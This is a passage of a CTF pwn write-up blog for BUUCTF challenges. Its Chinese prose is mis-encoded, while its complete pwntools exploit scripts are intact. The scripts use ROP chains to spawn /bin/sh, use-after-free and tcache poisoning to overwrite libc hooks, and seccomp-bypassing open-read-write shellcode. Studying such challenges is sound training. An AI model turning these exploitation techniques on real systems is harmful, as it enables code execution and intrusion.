    <link href="/2020/07/10/BUUCTF%E6%9A%91%E5%81%87%E5%88%B7%E9%A2%98/"/>
    <url>/2020/07/10/BUUCTF%E6%9A%91%E5%81%87%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTFæš‘å‡åˆ·é¢˜-1"><a href="#BUUCTFæš‘å‡åˆ·é¢˜-1" class="headerlink" title="BUUCTFæš‘å‡åˆ·é¢˜(1)"></a>BUUCTFæš‘å‡åˆ·é¢˜(1)</h1><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a><code>cmcc_simplerop</code></h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é™æ€é“¾æ¥ã€‚32ä½ç¨‹åºã€‚ç”¨<code>int 80h</code> è¿™ä¸ªä¸­æ–­è°ƒç”¨ï¼Œå‘¼å«ç³»ç»Ÿè°ƒç”¨ç¨‹åº<code>system_call()</code>.ã€‚</p><p>ç„¶årop æ§åˆ¶EAX = 0Xb = 11ï¼ŒEBX = &amp;(â€œ/bin/shâ€), ECX = EDX = 0ï¼Œå³æ‰§è¡Œäº†<code>sys_execve(&quot;/bin/sh&quot;, 0, 0, 0)</code>ï¼Œå³å¯æ‹¿åˆ°shellã€‚</p><p>32ä½ç³»ç»Ÿè°ƒç”¨è¡¨ï¼š<a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">https://blog.csdn.net/xiaominthere/article/details/17287965</a></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./simplerop&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29124)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()offset = 32start = 0x8048E45read = 0x806CD50pop_eax_ret = 0x080bae06pop_ebx_ret = 0x080481c9pop_ecx_ebx_ret = 0x0806e851pop_edx_ret = 0x0806e82apop3_ret = 0x08048913bss = 0x80EC2EC - 0x10ret = 0x8048E6Fin_t_0x80 = 0x080493e1payload = &#39;a&#39; * offset + flat([read,pop3_ret,0,bss,0x8])payload += flat([pop_eax_ret,11,pop_ecx_ebx_ret,0,bss,pop_edx_ret,0,in_t_0x80])sa(&#39;:&#39;,payload)s(&#39;/bin/sh\x00&#39;)itr()</code></pre><p>å…¶ä¸­ropé“¾readåè¿”å›åœ°å€ï¼š<code>pop3_ret</code>ï¼Œæ˜¯ä¸ºäº†pop <code>0,bss,0x8</code>ï¼Œç„¶åå†è·Ÿç€ropã€‚</p><h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a><code>ciscn_2019_n_3</code></h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Ubuntu 18 ,å­˜åœ¨UAFæ¼æ´ã€‚</p><pre><code class="c">int __cdecl rec_str_free(void *ptr){  free(*((void **)ptr + 2));  free(ptr);  return puts(&quot;Note freed!&quot;);}</code></pre><p>æ¯åˆ›å»ºä¸€ä¸ªå †ï¼Œå°±æœ‰ä¸€ä¸ª0x10çš„å †ç©ºé—´ï¼Œå­˜æ”¾å‡½æ•°æŒ‡é’ˆã€‚ä¸€çœ‹åˆ°è¿™ä¸ªï¼Œå°±å¯ä»¥è¯´æ˜¯æš—ç¤ºæ”»å‡»è¿™ä¸ªåœ°æ–¹æ¥åŠ«æŒç¨‹åºæµç¨‹ã€‚</p><pre><code class="c">int do_del(){  int v0; // eax  v0 = ask((int)&quot;Index&quot;);  return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]);}</code></pre><p>åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥åŠ«æŒç¨‹åºæµç¨‹ã€‚<br>å…ˆ<code>new(0,2,0x40,payload)</code>çœ‹ä¸€ä¸‹ç¨‹åºçš„å†…å­˜æƒ…å†µ, å¯¹äºå…¶ä¸­çš„<code>(*(int (__cdecl **)(int))(records[v0] + 4))(records[v0])</code> ï¼š</p><pre><code class="c">gefâ¤  p &amp;records$1 = (&lt;data variable, no debug info&gt; *) 0x804b080 &lt;records&gt;gefâ¤  x/wx 0x804b0800x804b080 &lt;records&gt;:    0x08635160gefâ¤  x/wx 0x086351600x8635160:      0x080486de</code></pre><p>æ‰€ä»¥ <code>records[v0]</code>  = 0x08635160 </p><pre><code class="c">gefâ¤  x/wx 0x08635160+40x8635164:      0x08048725gefâ¤  x/i 0x08048725   0x8048725 &lt;rec_str_free&gt;:    push   ebp</code></pre><p>æ‰€ä»¥ <code>*(int (__cdecl **)(int))(records[v0] + 4))</code>  = <code>0x8048725 &lt;rec_str_free&gt;:</code></p><p>ä¸”<br><img src="http://qiqianyun.chumen77.xyz/uPic/VT03Ns.png" srcset="/img/loading.gif" alt><br>å¦‚å›¾ï¼ŒæŠŠè¿™é‡Œçš„å‡½æ•°æŒ‡é’ˆæ§åˆ¶æˆ<code>sh\x00\00</code> + <code>&amp;system</code> ,å³æ‰§è¡Œ<code>do_del</code>æ—¶ï¼Œè¿è¡Œçš„å°±æ˜¯<code>system(sh)</code>å¯æ‹¿åˆ°shellã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_2019_n_3&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,26453)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def new(id,type,len,context):    sla(&quot;CNote &gt;&quot;,&#39;1&#39;)    sla(&quot;dex &gt;&quot;,str(id))    sla(&quot;Type &gt;&quot;,str(type))    sla(&quot;th &gt;&quot;,str(len))    sa(&quot;ue &gt;&quot;,str(context))def free(id):    sla(&quot;CNote &gt;&quot;,&#39;2&#39;)    sla(&quot;dex &gt;&quot;,str(id))def show(id):    sla(&quot;CNote &gt;&quot;,&#39;3&#39;)    sla(&quot;dex &gt;&quot;,str(id))payload = &quot;a&quot; + &#39;\n&#39;new(0,2,0x40,payload)new(1,2,0x40,payload)free(1)free(0)system = elf.plt[&#39;system&#39;]new(2,2,0x9,&#39;sh\x00\x00&#39;+ p32(system))free(1)itr()</code></pre><h4 id="æ— systemå‡½æ•°æƒ…å†µä¸‹"><a href="#æ— systemå‡½æ•°æƒ…å†µä¸‹" class="headerlink" title="æ— systemå‡½æ•°æƒ…å†µä¸‹"></a>æ— systemå‡½æ•°æƒ…å†µä¸‹</h4><p>Leak libcï¼Œè¿˜æ˜¯æ”»å‡»é‚£ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæœ¬åœ°é€šè¿œç¨‹æ²¡é€šã€‚</p><p>åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œç”±äºfgetsæ€»æ˜¯åœ¨ä½ ä¼ å…¥çš„å­—ç¬¦ä¸²ååŠ ä¸Š<code>\x00</code>ï¼Œæ›¾ç»å°±é‡åˆ°<br>è¿‡ï¼Œå¯¼è‡´æ³„æ¼ååˆ†éš¾è¿›è¡Œï¼Œä½†æ˜¯å‘ç°ï¼š</p><pre><code class="python">payload = &#39;&#39;new(2,2,0x0,payload)ru(&quot;lue=&quot;)libc_base = uu32(r(4)) - 0x1d89d8</code></pre><p>ä¼ å…¥ç©ºå­—èŠ‚ç«Ÿç„¶å¯ä»¥é€šè¿‡ï¼Œä¸”æ²¡æœ‰åŠ ä¸Š<code>\x00</code>ï¼Œä»è€Œä¸å½±å“æ³„æ¼libcã€‚è¿˜ä¸çŸ¥é“æ˜¯å¦ä»¥åé‡åˆ°fgetså‡½æ•°å°±å¯ä»¥è¿™æ ·å¤„ç†å…¶å½±å“ï¼Œå…ˆæŒ–ä¸ªå‘ï¼Œè®°å½•ç€ã€‚</p><pre><code class="python">payload = &#39;a&#39; + &#39;\n&#39;new(0,2,0x400,payload)new(1,2,0x400,payload)free(0)payload = &#39;&#39;new(2,2,0x0,payload)ru(&quot;lue=&quot;)libc_base = uu32(r(4)) - 0x1d89d8info_addr(&quot;libc_base&quot;,libc_base)payload = &#39;\x00&#39;*4 + &#39;/bin/sh\x00&#39; +&#39;\n&#39;new(3,2,0x400-0x10-0x10,payload)new(4,2,0x40,payload)new(5,2,0x40,payload)free(5)free(4)rec = libc_base + 0x3d123new(6,2,0x9,p32(rec) + p32(rec))# free(5)show(5)# debug()itr()</code></pre><h2 id="V-amp-N2020easyTHeap"><a href="#V-amp-N2020easyTHeap" class="headerlink" title="V&amp;N2020easyTHeap"></a>V&amp;N2020easyTHeap</h2><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Ubuntu 18 ,å­˜åœ¨UAFæ¼æ´ï¼Œtcache dupæ”»å‡»ã€‚</p><p>è€ƒç‚¹ï¼š</p><ul><li>æ”»å‡»<code>tcache_perthread_struct</code>ï¼Œä¼ªé€ tcacheå·²ç»æ»¡äº†</li><li>æ”»å‡»<code>tcache_entry</code>ï¼Œåœ¨æŒ‡å®šçš„ä½ç½®å†™ä¸Šç›®æ ‡åœ°å€ï¼Œåœ¨ç”³è¯·ä¸€ä¸ªå¯¹åº”å¤§å°çš„å †ï¼Œå³å¯å®ç°ä»»æ„åœ°å€å†™å…¥ã€‚<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3></li></ul><pre><code class="python">from pwn import *import timelocal_file  = &#39;./vn_pwn_easyTHeap&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;remote_libc = &#39;./libc-2.27.so&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25814)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size):    sla(&quot;choice&quot;,&#39;1&#39;)    sla(&quot;?&quot;,str(size))def edit(idx,context):    sla(&quot;choice&quot;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&#39;content&#39;,str(context))def show(idx):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;idx&#39;,str(idx))def free(idx):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&quot;idx&quot;,str(idx))add(0x100) #0add(0x100) #1free(0)free(0)show(0)r()heapbase = uu64(r(6)) - 0x260info_addr(&#39;heapbase&#39;,heapbase)add(0x100) #2edit(2,p64(heapbase+0x10))add(0x100) #3add(0x100) #4edit(4,&#39;\x07&#39;*0x10)free(0)show(0)r()libc_base = uu64(r(6)) - 0x3ebca0info_addr(&#39;libc_base&#39;,libc_base)__malloc_hook = libc_base + 0x3ebc30__realloc_hook = __malloc_hook -0x8payload = &#39;\x00&#39; * (8+7) + &#39;\x01&#39; + &#39;\x00&#39; * (0x80 - 8 - 8) + &#39;\x00&#39; * 0x38 + p64(__realloc_hook)edit(4,payload)add(0x100) #5onerec = 0x10a38c + libc_baserealloc_addr = libc_base + libc.symbols[&#39;__libc_realloc&#39;]info_addr(&#39;relloc&#39;,realloc_addr)info_addr(&#39;__malloc_hook&#39;,__malloc_hook)payload = p64(onerec) + p64(realloc_addr+8)edit(5,payload)add(0x100)#debug()itr()</code></pre><h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a><code>ciscn_2019_final_3</code></h2><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Ubuntu 18ï¼Œä¿æŠ¤å…¨å¼€ï¼Œå­˜åœ¨uafæ¼æ´ã€‚</p><p>ç¨‹åºåªæœ‰å¢åŠ å’Œåˆ é™¤çš„åŠŸèƒ½ï¼Œä½†æ˜¯å¢åŠ ä¸€ä¸ªå †å—åå›ç»™ä½ è¿”å›ç”³è¯·å †å—çš„åœ°å€ä¿¡æ¯ã€‚</p><pre><code class="c"> printf(&quot;gift :%p\n&quot;, heaplist[HIDWORD(size)]);</code></pre><p>åˆ é™¤å †åï¼Œæ²¡æœ‰ç½®0çš„æ“ä½œï¼Œå­˜åœ¨uafã€‚</p><p>è€ƒç‚¹ï¼š</p><ul><li>æ”»å‡»<code>tcache_perthread_struct</code>ï¼Œä¼ªé€ tcacheå·²ç»æ»¡äº†</li><li>æ”»å‡»<code>tcache_entry</code>ï¼Œåœ¨æŒ‡å®šçš„ä½ç½®å†™ä¸Šç›®æ ‡åœ°å€ï¼Œåœ¨ç”³è¯·ä¸€ä¸ªå¯¹åº”å¤§å°çš„å †ï¼Œå³å¯å®ç°ä»»æ„åœ°å€å†™å…¥ã€‚</li></ul><p>éš¾ç‚¹ï¼š</p><ul><li>æ³„æ¼libcåœ°å€</li><li>ç²¾å·§çš„æ„é€ ä¸€ä¸ªä»»æ„åœ°å€å†™ï¼ˆåœ¨<code>tcache struct</code>å¤„æŠ˜è…¾ï¼‰</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *import timelocal_file  = &#39;./ciscn_final_3&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27714)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,content):    sla(&quot;&gt;&quot;,&#39;1&#39;)    sla(&#39;index&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;thing&#39;,str(content))    ru(&quot;0x&quot;)    gift = int(r(12),16)    info_addr(&#39;gift&#39;,gift)    return giftdef free(idx):    sla(&quot;&gt;&quot;,&#39;2&#39;)    sla(&quot;index&quot;,str(idx))heap_base = add(0,0x48,&#39;a&#39;) - 0x11e70free(0)free(0)add(1,0x48,p64(heap_base+0x10))add(2,0x48,p64(heap_base+0x10))payload = 0x30 * &#39;\x07&#39;add(3,0x48,payload)free(3)payload = 0x30 * &#39;\x00&#39;add(4,0x48,payload)add(5,0x10,&#39; &#39;)libc_base = add(6,0x78,&#39; &#39;) - 0x3ebca0info_addr(&#39;libc_base&#39;,libc_base)free_hook = libc_base + 0x3ed8e8free(5)add(7,0x10,p64(free_hook)*2)one_rec = 0x4f322 + libc_baseadd(8,0x48,p64(one_rec))# debug()free(4)itr()</code></pre><p>è°ƒè¯•ä¸€ä¸‹å°±æ‡‚äº†ã€‚å…¶ä¸­0x10é‚£ä¸ªå †å—çš„ç”³è¯·å¾ˆé‡è¦ï¼Œæ­£å¥½å¯ä»¥ä¾›åé¢çš„ä½¿ç”¨ã€‚</p><h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a><code>picoctf_2018_rop chain</code></h2><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>åªæ˜¯ä¸€ä¸ªç®€å•çš„ropï¼Œè€ƒçš„å°±æ˜¯32ä½ä¸‹å¦‚ä½•æ§åˆ¶ä¼ å‚æ•°ã€‚</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./PicoCTF_2018_rop_chain&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29550)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;] #,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()win_function1 = 0x080485CBwin_function2 = 0x80485D8flag = 0x0804862Boffset = 0x18 + 4ru(&#39;Enter your input&gt;&#39;)payload = &#39;a&#39; * offset + flat([win_function1,win_function2,flag,0xBAAAAAAD,0xDEADBAAD])# debug()s(payload + &#39;\n&#39;)itr()</code></pre><h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a><code>pwnable_orw</code></h2><h3 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è€ƒç‚¹ ï¼š</p><ul><li>ç®€å•shellcode çš„ç¼–å†™</li><li>seccompï¼ˆæŒ–å‘ï¼‰</li></ul><p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><p><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/P0Ku7D.png" srcset="/img/loading.gif" alt></p><p>å…ˆç”¨<code>seccomp-tools</code>çœ‹ä¸‹ç¦ç”¨äº†ä»€ä¹ˆå‡½æ•°ï¼š</p><pre><code>âœ  pwnable_orw seccomp-tools dump ./orw line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code></pre><p>æ˜æ˜¾åªèƒ½æ‰§è¡Œ open read wirte å‡½æ•°ã€‚</p><pre><code>#è¿™é‡Œå¯ä»¥ç”¨pwntoolsåº“çš„ä¸€ä¸ªå‡½æ•°ä»£æ›¿,shellcraftcè¯­è¨€:open(&quot;/home/orw/flag&quot;) &lt;==&gt; æ±‡ç¼–:asm(shellcraft.open(&quot;/home/orw/flag&quot;))cè¯­è¨€:read(3,buf,0x20)&lt;==&gt; æ±‡ç¼–:asm(shellcraft.read(3,&quot;esp&quot;,0x20)cè¯­è¨€:write(1,buf,0x20)&lt;==&gt;æ±‡ç¼–:asm(shellcraft.write(1,&quot;esp&quot;,0x20))</code></pre><p>å…¶ä¸­ å°±æ˜¯ä»¥espå½“åšä¸´æ—¶å˜é‡ bufçš„åœ°å€ï¼Œå…¶å¯ä»¥è‡ªå®šä¹‰ã€‚</p><p>å…¶ä¸­openå‡½æ•°æ‰§è¡Œåï¼Œç”±äºæ˜¯æ‰“å¼€äº†ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå…¶è¿”å›çš„fdå°±æ˜¯3ï¼Œæ‰€ä»¥åé¢è·Ÿç€çš„readçš„æ–‡ä»¶æè¿°ç¬¦ä¹Ÿä¸º3ã€‚</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./orw&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,26224)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()bss = 0x804A128 - 0x30payload= asm(shellcraft.open(&quot;./flag&quot;))payload += asm(shellcraft.read(3,bss,0x30))payload += asm(shellcraft.write(1,bss,0x30))sl(payload)itr()</code></pre><h2 id="V-amp-N2020-å…¬å¼€èµ›warmup"><a href="#V-amp-N2020-å…¬å¼€èµ›warmup" class="headerlink" title="V&amp;N2020 å…¬å¼€èµ›warmup"></a>V&amp;N2020 å…¬å¼€èµ›warmup</h2><h3 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å¼€å¯äº†æ²™ç›’ï¼Œä½¿ç”¨orwè·å–flagå³å¯ã€‚</p><pre><code>Here is my gift: 0x7f411f85c9c0 line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0011: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><p>å…¶ä¸­ï¼Œè¿™é¢˜å› ä¸ºåªæœ‰<code>0x10</code>çš„æº¢å‡ºç©ºé—´ï¼ŒçŒ›çš„ä¸€çœ‹éœ€è¦æ ˆè¿ç§»ï¼Œä½†æ˜¯ä¼šå‘ç°ä¸çŸ¥é“å¾€å“ªé‡Œè¿ç§»ã€‚çœ‹äº†å¸ˆå‚…ä»¬çš„åšå®¢æ‰çŸ¥é“ï¼Œç”±äºç¬¬ä¸€ä¸ªæ ˆç©ºé—´è¾ƒå¤§ï¼Œä¸”ä¸ç¬¬äºŒä¸ªå¯ä»¥æº¢å‡ºçš„æ ˆæ˜¯<strong>ç´§é‚»</strong>çš„ã€‚ç„¶åï¼Œå°±å¯ä»¥åœ¨æº¢å‡ºæ—¶è¦†ç›–ä¸€ä¸‹è¿”å›åœ°å€ï¼Œè¦†ç›–ä¸ºretï¼Œè¿™æ ·å°±å¯ä»¥å¤šä¸€ä¸ªretï¼Œä»è€Œ<strong>æ¥ç€æ‰§è¡Œ</strong>ä¸Šä¸€ä¸ªæ ˆå¸§bufé‡Œé¢æ„é€ çš„ropé“¾ã€‚</p><p>å¹¶ä¸”åœ¨orwä¸­ï¼Œopenå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ—¶ä¸€ä¸ªæŒ‡é’ˆåœ°å€(<code>*filename</code>)ï¼Œæ‰€ä»¥éœ€è¦å…ˆreadä¸€ä¸‹flagçš„æ–‡ä»¶ååˆ°ä¸€ä¸ªbufå½“ä¸­ï¼Œç„¶åå†è¿›è¡Œorwã€‚</p><p>Bufçš„å¯»æ‰¾ï¼š<br>åœ¨libcä¸­æ‰¾ä¸€ä¸ªæ²¡æœ‰ç”¨åˆ°çš„åœ°å€æ®µå³å¯ã€‚æ¯”å¦‚<code>__free_hook</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/B3tfJG.png" srcset="/img/loading.gif" alt></p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./vn_pwn_warmup&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = 